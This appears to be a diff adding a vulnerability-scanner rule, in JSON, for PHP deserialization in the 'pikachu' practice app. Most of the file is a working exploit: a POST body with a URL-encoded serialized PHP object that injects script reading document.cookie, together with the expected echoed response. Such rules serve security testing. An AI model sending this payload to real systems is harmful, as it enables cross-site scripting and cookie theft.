@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "PHP反序列化",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/unserilization/unser.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "o=O%3A1%3A%22S%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A39%3A%22%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%22%3B%7D"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<script>alert(document.cookie)</script>"
+            }
+        }
+    }
+}
